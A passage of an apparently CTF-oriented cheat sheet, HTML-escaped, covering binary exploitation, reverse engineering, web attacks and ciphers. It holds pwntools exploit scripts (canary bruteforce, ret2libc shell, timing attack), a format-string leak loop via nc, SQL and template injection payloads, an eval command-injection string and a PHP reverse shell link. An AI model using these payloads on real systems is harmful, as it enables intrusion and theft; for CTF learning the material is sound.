&lt;li&gt;ropr&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Stack Canary&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;Finding the stack canary in a debugger&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Stack canary is a value placed before the EIP/RIP (instruction pointer) that can overwritten by a buffer overflow. The program causes an error basically if the stack is overwritten to something different than it originally was. Our goal is to find the original stack so when we overflow, the program runs normally.&lt;/li&gt; &#xA; &lt;li&gt;The stack canary is taken from &lt;code&gt;gs&lt;/code&gt;, or &lt;code&gt;fs&lt;/code&gt; (for 32 and 64 bit respectively) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;In the disassembly, before something is read, you can see a line similar to the following:&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;   0x000000000000121a &amp;lt;+4&amp;gt;: sub    rsp,0x30&#xA;   0x000000000000121e &amp;lt;+8&amp;gt;: mov    rax,QWORD PTR fs:0x28&#xA;   0x0000000000001227 &amp;lt;+17&amp;gt;:mov    QWORD PTR [rbp-0x8],rax&#xA;   0x000000000000122b &amp;lt;+21&amp;gt;:xor    eax,eax&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Here, the stack canary is moved into &lt;code&gt;rax&lt;/code&gt; at offset +8. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Thus, break at the next offset and check what&#39;s in rax (&lt;code&gt;i r rax&lt;/code&gt;) to see what the current canary is&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Static Canaries&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A canary is only static if it was manually implemented by the programmer (which is the case in some intro pwn challenges), or if you are able to fork the program. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;When you fork the binary, the forked one has the same canary, so you can do a byte-by-byte bruteforce on that&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Extra&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When a stack canary is improperly overwritten, it will cause a call to &lt;code&gt;__stack_chk_fail&lt;/code&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;If we can&#39;t leak the canary, we can also modify the GOT table to prevent it from being called&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The canary is stored in the &lt;code&gt;TLS&lt;/code&gt; structure of the current stack and is initialized by &lt;code&gt;security_init&lt;/code&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;If you can overwrite the real canary value, you can set it equal whatever you decide to overflow.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Simple script to bruteforce a static 4 byte canary:&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/bin/python3&#xA;from pwn import *&#xA;&#xA;#This program is the buffer_overflow_3 in picoCTF 2018&#xA;elf = ELF(&#39;./vuln&#39;)&#xA;&#xA;# Note that it&#39;s probably better to use the chr() function too to get special characters and other symbols and letters.&#xA;# But this canary was pretty simple :)&#xA;alphabet = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;&#xA;&#xA;canary = &#39;&#39;&#xA;# Here we are bruteforcing a canary 4 bytes long&#xA;for i in range(1,5):&#xA;&#x9;for letter in range(0,len(alphabet)):  # We will go through each letter/number in the string &#39;alphabet&#39;&#xA;&#x9;&#x9;p = elf.process()  # We start the process&#xA;&#x9;&#x9;wait = p.recv().decode(&#39;utf-8&#39;)&#xA;&#x9;&#x9;p.sendline(str(32+i))  # In this program, we had to specify how many bytes we were gonna send.&#xA;&#x9;&#x9;wait = p.recv().decode(&#39;utf-8&#39;)&#xA;&#x9;&#x9;p.sendline(&#39;A&#39;*32 + canary + alphabet[letter])  # We send the 32 A&#39;s to overflow, and then the canary we already have + our guess&#xA;&#x9;&#x9;prompt = p.recv().decode(&#39;utf-8&#39;)&#xA;&#x9;&#x9;if &#34;Stack&#34; not in prompt:  # The program prints &#34;Stack smashed [...]&#34; if we get wrongfully write the canary.&#xA;&#x9;&#x9;&#x9;canary += alphabet[letter]  # If it doesn&#39;t print that, we got part of our canary :)&#xA;&#x9;&#x9;&#x9;break  # Move on to the next canary letter/number&#xA;&#xA;print(&#34;The canary is: &#34; + canary)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Format String Vulnerabilities&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Look at Table 2 for what to try if you see &#34;printf(buf)&#34; or something like that: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://owasp.org/www-community/attacks/Format_string_attack&#34;&gt;https://owasp.org/www-community/attacks/Format_string_attack&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Highly recommend looking at John Hammond doing &#39;echooo&#39; challenge from picoCTF 2018&lt;/li&gt; &#xA; &lt;li&gt;Sometimes, trying to print only strings from the stack like this: &#39;%s %s %s %s %s %s&#39; may cause errors since not everything in the stack is a string.&lt;/li&gt; &#xA; &lt;li&gt;Try to minimize that by doing &#39;%x %x %x %x %x %s&#39; instead&lt;/li&gt; &#xA; &lt;li&gt;Instead of having to constantly increase how many %x and %s you type, you can pass a parameter to make it easier: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;%1$s&lt;/code&gt; | This will print the first value in the stack (from what I understand, the one right next to your buffer) as a string.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;%2$s&lt;/code&gt; | This will print the 2nd value as a string, and you get the idea&lt;/li&gt; &#xA;   &lt;li&gt;You can use one-liner loops to try to find the flag by leaking the stack. Press ^C (CTRL + C) to go to the next value. &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;for i in {1..100}; do echo &#34;%$i\$s&#34; | nc [b7dca240cf1fbf61.247ctf.com](http://b7dca240cf1fbf61.247ctf.com/) 50478; done&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;You can control how much you leak using different size parameters: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;%hhx&lt;/code&gt; leaks 1 byte (half of half of int size)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;%hx&lt;/code&gt; leaks 2 bytes (half of int size)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;%x&lt;/code&gt; leaks 4 bytes (int size)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;%lx&lt;/code&gt; leaks 8 bytes (long size)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;very good video on modifying the stack with fstring vuln and %n: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=gzLPVkZbaPA&amp;amp;ab_channel=MartinCarlisle&#34;&gt;https://www.youtube.com/watch?v=gzLPVkZbaPA&amp;amp;ab_channel=MartinCarlisle&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Shellcode&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Good website to find different shellcode: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://shell-storm.org/shellcode/&#34;&gt;http://shell-storm.org/shellcode/&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Return-to-Libc&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;We will overwrite the EIP to call the system() library function and we will also pass what it should execute, in this example a buffer with &#34;/bin/sh&#34;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Good explanation:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=FvQYGAM1X9U&amp;amp;ab_channel=NPTEL-NOCIITM&#34;&gt;https://www.youtube.com/watch?v=FvQYGAM1X9U&amp;amp;ab_channel=NPTEL-NOCIITM&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Good example (go to 3:22:44):&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=uIkxsBgkpj8&amp;amp;t=13257s&amp;amp;ab_channel=freeCodeCamp.org&#34;&gt;https://www.youtube.com/watch?v=uIkxsBgkpj8&amp;amp;t=13257s&amp;amp;ab_channel=freeCodeCamp.org&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=NCLUm8geskU&amp;amp;ab_channel=BenGreenberg&#34;&gt;https://www.youtube.com/watch?v=NCLUm8geskU&amp;amp;ab_channel=BenGreenberg&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Get address for execve(&#34;/bin/sh&#34;)&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;one_gadget &amp;lt;libc file&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you already know the libc file and a location (ie. dont have to leak them...)&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/bin/python3&#xA;&#xA;from pwn import *&#xA;import os&#xA;&#xA;binaryName = &#39;ret2libc1&#39;&#xA;&#xA;# get the address of libc file with ldd&#xA;libc_loc = os.popen(f&#39;ldd {binaryName}&#39;).read().split(&#39;\n&#39;)[1].strip().split()[2]&#xA;&#xA;# use one_gadget to see where execve is in that libc file&#xA;one_gadget_libc_execve_out = [int(i.split()[0], 16) for i in os.popen(f&#39;one_gadget {libc_loc}&#39;).read().split(&#34;\n&#34;) if &#34;execve&#34; in i]&#xA;&#xA;# pick one of the suitable addresses&#xA;libc_execve_address = one_gadget_libc_execve_out[1]&#xA;&#xA;p = process(f&#39;./{binaryName}&#39;)&#xA;e = ELF(f&#39;./{binaryName}&#39;)&#xA;l = ELF(libc_loc)&#xA;&#xA;# get the address of printf from the binary output&#xA;printf_loc = int(p.recvuntil(&#39;\n&#39;).rstrip(), 16)&#xA;&#xA;# get the address of printf from libc&#xA;printf_libc = l.sym[&#39;printf&#39;]&#xA;&#xA;# calculate the base address of libc&#xA;libc_base_address = printf_loc - printf_libc&#xA;&#xA;# generate payload&#xA;&#xA;# 0x17 is from gdb analysis of offset from input to return address&#xA;offset = 0x17&#xA;&#xA;payload = b&#34;A&#34;*offset&#xA;payload += p64(libc_base_address + libc_execve_address)&#xA;&#xA;# send the payload&#xA;p.sendline(payload)&#xA;&#xA;# enter in interactive so we can use the shell created from our execve payload&#xA;p.interactive()&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Reverse Engineering&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Cool Guide: &lt;a href=&#34;https://opensource.com/article/20/4/linux-binary-analysis&#34;&gt;https://opensource.com/article/20/4/linux-binary-analysis&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ghidra-sre.org/&#34;&gt;Ghidra&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Very useful decompiler&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;dotPeek or dnSpy &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;decompile .NET executables&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/skylot/jadx&#34;&gt;jadx&lt;/a&gt; and jadx-gui &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;decompile apks&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://devtoolzone.com/decompiler/java&#34;&gt;devtoolzone&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;decompile java online&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/QuiltMC/quiltflower/&#34;&gt;Quiltflower&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Advanced terminal-based java decompiler&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;apktool &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;decompile apks&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;apktool d *.apk&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.gnu.org/software/gdb/&#34;&gt;gdb&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Binary analysis&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/longld/peda&#34;&gt;peda&lt;/a&gt; (extension for increased functionality)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/hugsy/gef&#34;&gt;gef&lt;/a&gt; (gdb extension for pwners)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/radareorg/radare2&#34;&gt;radare2&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Binary analysis&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mandiant/flare-floss&#34;&gt;FLOSS&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;strings&lt;/code&gt; on steroids. Uses static analysis to find and calculate strings&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;SMT Solvers&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/angr/angr&#34;&gt;angr&lt;/a&gt; (python) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.angr.io/core-concepts/toplevel&#34;&gt;Docs&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/.resources/SMT_Solvers.md#2-angr&#34;&gt;Tutorial&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Z3Prover/z3&#34;&gt;z3&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/.resources/SMT_Solvers.md#1-z3&#34;&gt;Tutorial&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Reversing byte-by-byte checks (side-channel attack)&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://dustri.org/b/defeating-the-recons-movfuscator-crackme.html&#34;&gt;https://dustri.org/b/defeating-the-recons-movfuscator-crackme.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Here&#39;s a version I made for a challenge that uses a time-based attack: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;You might have to run it a couple times just to account for randomness&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python3&#34;&gt;#!/bin/python3&#xA;&#xA;from pwn import *&#xA;import string&#xA;&#xA;keyLen = 8&#xA;binaryName = &#39;binary&#39;&#xA;&#xA;context.log_level = &#39;error&#39;&#xA;&#xA;s = &#39;&#39;&#xA;print(&#34;*&#34;*keyLen)&#xA;for chars in range(keyLen):&#xA;    a = []&#xA;    for i in string.printable:&#xA;        p = process(f&#39;perf stat -x, -e cpu-clock ./{binaryName}&#39;.split())&#xA;        p.readline()&#xA;        currPass = s + i + &#39;0&#39;*(keyLen - chars - 1)&#xA;        # print(currPass)&#xA;        p.sendline(currPass.encode())&#xA;        p.readline()&#xA;        p.readline()&#xA;        p.readline()&#xA;        info = p.readall().split(b&#39;,&#39;)[0]&#xA;        p.close()&#xA;        try:&#xA;            a.append((float(info), i))&#xA;        except:&#xA;            pass&#xA;        # print(float(info), i)&#xA;    a.sort(key = lambda x: x[0])&#xA;    s += str(a[-1][1])&#xA;    print(s + &#34;*&#34;*(keyLen - len(s)))&#xA;    # print(sorted(a, key = lambda x: x[0]))&#xA;&#xA;p = process(f&#39;./{binaryName}&#39;)&#xA;p.sendline(s.encode())&#xA;p.interactive()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Searching strings with gef&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If your flag is being read into a variable or register at any point, you can break after it is moved and run &lt;code&gt;grep &amp;lt;string&amp;gt;&lt;/code&gt; and gef will automatically show you the string that matches your search pattern&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Web&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tools.kali.org/information-gathering/nikto&#34;&gt;Nikto&lt;/a&gt; (if allowed) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;automatically looks for vulnerabilities&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tools.kali.org/web-applications/gobuster&#34;&gt;gobuster&lt;/a&gt; (if allowed) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Brute forces directories and files&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tools.kali.org/password-attacks/hydra&#34;&gt;hydra&lt;/a&gt; (if allowed) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Brute forces logins for various services&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://portswigger.net/burp&#34;&gt;BurpSuite&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Intercepts web requests and allows you to modify them&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Analyze live network traffic and pcap files&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php&#34;&gt;php reverse shell&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Useful for websites that allow you to upload files&lt;/li&gt; &#xA;   &lt;li&gt;This file needs to be executed on the server to work&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jwt.io/&#34;&gt;jwt&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;You can identify a JWT token since it begins with &#34;ey&#34;&lt;/li&gt; &#xA;   &lt;li&gt;This site will decode JSON web tokens&lt;/li&gt; &#xA;   &lt;li&gt;You can crack the secret for the JSON web token to modify and sign your own tokens &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;echo &amp;lt;token&amp;gt; &amp;gt; jwt.txt&lt;/code&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;code&gt;john jwt.txt&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;SQL injection &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;sqlmap &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;sqlmap --forms --dump-all -u &amp;lt;url&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;     &lt;li&gt;Automates the process of SQL injection&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Basic SQL injection &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Enter &lt;code&gt;&#39;OR 1=1--&lt;/code&gt; in login form&lt;/li&gt; &#xA;     &lt;li&gt;On the server this will evaluate to &lt;code&gt;SELECT * FROM Users WHERE User = &#39;&#39; OR 1=1--&#39; AND Pass = &#39;&#39;&lt;/code&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;code&gt;1=1&lt;/code&gt; evaluates to true, which satisfies the &lt;code&gt;OR&lt;/code&gt; statement, and the rest of the query is commented out by the &lt;code&gt;--&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings&#34;&gt;PayloadsAllTheThings&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Great resource for web exploitation with lots of payloads&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Template Injection &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/epinna/tplmap&#34;&gt;tplmap&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Automated server-side template injection&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Jinja Injection &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;{{ config.items() }}&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Flask Injection &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;{{config}}&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Python eval() function &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;__import__.(&#39;subprocess&#39;).getoutput(&#39;&amp;lt;command&amp;gt;&#39;)&lt;/code&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;make sure to switch the parentheses if it doesn&#39;t work&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;code&gt;__import__.(&#39;subprocess&#39;).getoutput(&#39;ls&#39;).split(&#39;\\n&#39;)&lt;/code&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;list files in system&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1&#34;&gt;More python injection&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Cross Site Scripting &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://csp-evaluator.withgoogle.com/&#34;&gt;CSP Evaluator&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Google&#39;s Content Security Policy Evaluator&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Fuzzing input fields&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;FFUF &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Copy the request to the input field and replace the parameter with &#34;FUZZ&#34;: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;code&gt;ffuf -request input.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mc all&lt;/code&gt;&lt;/li&gt; &#xA;     &lt;li&gt;Use &lt;code&gt;-fs&lt;/code&gt; to filter sizes&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Crypto&lt;/h2&gt; &#xA;&lt;h3&gt;CyberChef&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Carries out various cryptography operations&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.boxentriq.com/code-breaking/cipher-identifier&#34;&gt;Cipher Detector&lt;/a&gt;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&lt;/p&gt; &#xA;&lt;h3&gt;Hashes&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;hashid &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Command-line utility to detect the hash type&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Common Ciphers&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.dcode.fr/caesar-cipher&#34;&gt;Caesars Cipher&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.dcode.fr/vigenere-cipher&#34;&gt;Vigenere Cipher&lt;/a&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#### Solver using custom table&#xA;cipherText = &#34;&#34;&#xA;plainText = &#34;&#34;&#xA;flagCipherText = &#34;&#34;&#xA;tableFile = &#34;&#34;&#xA;&#xA;with open(cipherText) as fin:&#xA;    cipher = fin.readline().rstrip()&#xA;&#xA;with open(plainText) as fin:&#xA;    plain = fin.readline().rstrip()&#xA;&#xA;with open(flagCipherText) as fin:&#xA;    flag = fin.readline().rstrip()&#xA;&#xA;with open(tableFile) as fin:&#xA;    table = [i.rstrip().split() for i in fin.readlines()]&#xA;&#xA;table[0].insert(0, &#34;&#34;) # might have to modify this part.&#xA;&#x9;&#x9;&#x9;# just a 2d array with the lookup table&#xA;&#x9;&#x9;&#x9;# should still work if the table is slightly off, but the key will be wrong&#xA;key = &#34;&#34;&#xA;for i, c in enumerate(plain[0:100]):&#xA;  col = table[0].index(c)&#xA;  for row in range(len(table)):&#xA;    if table[row][col] == cipher[i]:&#xA;      key += table[row][0]&#xA;      break&#xA;&#xA;print(key)&#xA;&#xA;dec_flag = &#34;&#34;&#xA;for i, c in enumerate(flag[:-1]):&#xA;  col = table[0].index(key[i])&#xA;  for row in range(len(table)):&#xA;    if table[row][col] == flag[i]:&#xA;      dec_flag += table[row][0]&#xA;      break&#xA;&#xA;print(dec_flag)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.quipqiup.com/&#34;&gt;Substitution Cipher&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://rot13.com/&#34;&gt;Rot13&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.boxentriq.com/code-breaking/keyed-caesar-cipher&#34;&gt;Keyed Caesars cipher&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;RSA&lt;/h3&gt; &#xA;&lt;h4&gt;Grab RSA Info with pycryptodome&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from Crypto.PublicKey import RSA&#xA;&#xA;keyName = &#34;example.pem&#34;&#xA;&#xA;with open(keyName,&#39;r&#39;) as f:&#xA;&#x9;key = RSA.import_key(f.read())&#xA;&#xA;print(key)&#xA;&#xA;# You can also get individual parts of the RSA key &#xA;# (sometimes not all of 